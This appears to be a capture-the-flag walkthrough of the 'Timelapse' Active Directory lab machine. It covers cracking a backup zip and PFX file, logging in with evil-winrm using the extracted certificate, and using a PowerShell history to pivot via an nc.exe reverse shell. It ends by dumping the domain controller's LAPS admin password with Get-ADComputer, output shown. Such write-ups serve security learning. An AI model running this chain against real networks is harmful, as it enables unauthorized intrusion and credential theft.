# Timelapse

## Gaining Access

Nmap scan reveals the default AD ports that are open.

### Null Session

As usual, I always check the shares that I can access with no credentials, and found one here.

![](../../../.gitbook/assets/timelapse-9.png)

Within this share, we can find a `winrm_backup.zip` file that has a password on its files.

![](../../../.gitbook/assets/timelapse-6.png)

This is easily crackable with `zip2john` and `john`.

![](../../../.gitbook/assets/timelapse-5.png)

After unzipping the file, we can get a pfx file out. PFX files contains SSL certificates and private keys that could be useful for this machine.

I tried to import the certificate or extract the keys but this file is also password protected.

![](../../../.gitbook/assets/timelapse-12.png)

`pfx2john` and `john` again.

![](../../../.gitbook/assets/timelapse-1.png)

With this, we can extract the private key.

![](../../../.gitbook/assets/timelapse-4.png)

![](../../../.gitbook/assets/timelapse-10.png)

We also need to extract the .crt file using `openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt`.

### Certificate Abuse

When we extracted the private key and certificate, we can use `evil-winrm` to get into the machine.

```bash
evil-winrm -i timelapse.htb -S -k priv -c legacyy_dev_auth.crt
```

We are then the `legacyy` user on the machine.

## Privilege Escalation

### PS History

Running a WinPEAS, we can find that our current user has a Powershell HIstory present:

![](../../../.gitbook/assets/timelapse-2.png)

The PS History has commands used for remote Powershell-ing as another user called `svc_deploy`.

![](../../../.gitbook/assets/timelapse-11.png)

We can use this to gain a reverse shell as the `svc_deploy` user using whatever method. `nc.exe` is the easiest.

![](../../../.gitbook/assets/timelapse-3.png)

### LAPS\_Readers

When checking this user's privileges, we can see that we are part of the LAPS\_Readers group within the domain:

![](../../../.gitbook/assets/timelapse-8.png)

This means we can dump out the credentials for the DC:

```powershell
Get-ADComputer DC01 -property 'ms-mcs-admpwd'

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : uM[3va(s870g6Y]9i]6tMu{j
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

Then, we can just `evil-winrm` in as the administrator using these credentials. Either that or execute scriptblocks with more remote Powershell.

![](../../../.gitbook/assets/timelapse-7.png)
